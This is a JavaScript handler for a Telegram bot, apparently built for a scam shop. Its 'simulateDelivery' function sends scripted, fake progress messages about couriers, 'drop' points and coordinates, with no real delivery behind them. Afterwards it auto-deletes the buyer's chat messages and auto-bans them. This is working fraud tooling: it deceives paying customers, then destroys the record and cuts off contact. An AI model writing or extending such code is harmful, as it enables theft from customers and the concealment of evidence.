// 📦 core/handlers/deliveryHandler.js | IMMORTAL FINAL v1.0.0•GODMODE DIAMONDLOCK
// AUTO-STAGED DELIVERY • FSM CLEANUP • AUTO-BAN • AUTO-DELETE • 24/7 BULLETPROOF

import { banUser } from "../../utils/bans.js";
import { autobanEnabled, autodeleteEnabled } from "../../config/features.js";
import { sendAndTrack } from "../../helpers/messageUtils.js";
import { userSessions, userMessages, activeTimers } from "../../state/userState.js";
import { BOT } from "../../config/config.js";

/** When to trigger final cleanup (ms) */
const FINAL_CLEANUP_DELAY = 27 * 60 * 1000;

/** Delivery steps: [message, delay_ms] */
const DELIVERY_STEPS = {
  courier: [
    ["✅ Order confirmed!\n⏳ Preparing shipment...", 0],
    ["🚚 Courier en route! ETA ~20min.", 5 * 60 * 1000],
    ["📍 Courier nearby! ⚠️ Await exact location...", 10 * 60 * 1000],
    ["📬 Delivery in progress... Stand by.", 18 * 60 * 1000],
    ["✅ *Package delivered successfully.* Stay safe.", null]
  ],
  drop: [
    ["✅ Order confirmed!\n⏳ Drop point is being prepared...", 0],
    ["📦 Drop en route! ETA ~20min.", 5 * 60 * 1000],
    ["📍 Drop almost placed! ⚠️ Await coordinates.", 14 * 60 * 1000],
    ["📬 Drop placed! Follow instructions.", 19 * 60 * 1000],
    ["✅ *Package delivered successfully.* Stay safe.", null]
  ]
};

/**
 * 🚚 Starts the staged delivery sequence
 */
export function simulateDelivery(bot, id, method = "drop") {
  const uid = sanitizeId(id);
  if (!bot?.sendMessage || !uid) return;

  const session = userSessions[uid] ||= { step: 9, createdAt: Date.now() };
  if (session.deliveryInProgress) {
    debug(`Delivery already in progress for ${uid}`);
    return;
  }

  session.deliveryInProgress = true;
  session.step = 9;

  const steps = DELIVERY_STEPS[method.toLowerCase()] || DELIVERY_STEPS.drop;
  steps.forEach(([text, delay], idx) => {
    const fn = idx < steps.length - 1 ? sendStep : sendFinalStep;
    setTimeout(() => fn(bot, uid, text), delay || 0);
  });

  // schedule final cleanup
  if (activeTimers[uid]) clearTimeout(activeTimers[uid]);
  activeTimers[uid] = setTimeout(() => {
    triggerCleanup(bot, uid);
    delete activeTimers[uid];
  }, FINAL_CLEANUP_DELAY);
}

/** Send an intermediate delivery message (silent by default) */
async function sendStep(bot, uid, text) {
  await safeSend(bot, uid, text, true);
}

/** Send the final delivery message, then cleanup a few seconds later */
async function sendFinalStep(bot, uid, text) {
  await safeSend(bot, uid, text, false);
  setTimeout(() => triggerCleanup(bot, uid), 7000);
}

/**
 * Typing indicator + send + optional auto-delete
 */
async function safeSend(bot, uid, text, silent) {
  try {
    await bot.sendChatAction(uid, "typing").catch(() => {});
    await new Promise((r) => setTimeout(r, 500));

    const msg = await sendAndTrack(
      bot,
      uid,
      text,
      { parse_mode: "Markdown", disable_notification: silent },
      userMessages
    );

    if (
      autodeleteEnabled.status &&
      !isAdmin(uid) &&
      msg?.message_id
    ) {
      setTimeout(() => {
        bot.deleteMessage(uid, msg.message_id).catch(() => {});
      }, 15_000);
    }
  } catch (err) {
    console.error(`❌ [safeSend error] ${err.message || err}`);
  }
}

/**
 * AUTO-BAN / AUTO-DELETE / SESSION WIPE
 */
async function triggerCleanup(bot, uid) {
  const session = userSessions[uid];
  if (!session || session.cleanupScheduled) {
    debug(`Cleanup already triggered for ${uid}`);
    return;
  }
  session.cleanupScheduled = true;

  const isAdminUser = isAdmin(uid);

  // delete any tracked messages
  if (autodeleteEnabled.status && !isAdminUser && Array.isArray(userMessages[uid])) {
    for (const msgId of userMessages[uid]) {
      bot.deleteMessage(uid, msgId).catch(() => {});
    }
    delete userMessages[uid];
  }

  // auto-ban if configured
  if (autobanEnabled.status && !isAdminUser) {
    await sendAndTrack(
      bot,
      uid,
      "⏳ *Session closed.*\n⛔️ Access restricted for security reasons.",
      { parse_mode: "Markdown" },
      userMessages
    );
    await banUser(uid);
    console.warn(`⛔️ Auto-banned user ${uid}`);
  }

  // final session wipe
  cleanupSession(uid);
  debug(`Cleanup complete for ${uid}`);
}

/** Remove timers and session */
function cleanupSession(uid) {
  if (activeTimers[uid]) {
    clearTimeout(activeTimers[uid]);
    delete activeTimers[uid];
  }
  delete userSessions[uid];
}

/** True if this user is the bot admin */
function isAdmin(uid) {
  return String(uid) === String(BOT.ADMIN_ID);
}

/** Simple debug log (only if DEBUG_MESSAGES=true) */
function debug(...args) {
  if (process.env.DEBUG_MESSAGES === "true") {
    console.log(...args);
  }
}

/** Cleanly sanitize incoming chat IDs */
function sanitizeId(id) {
  const s = String(id || "").trim();
  return s && s !== "undefined" && s !== "null" ? s : null;
}
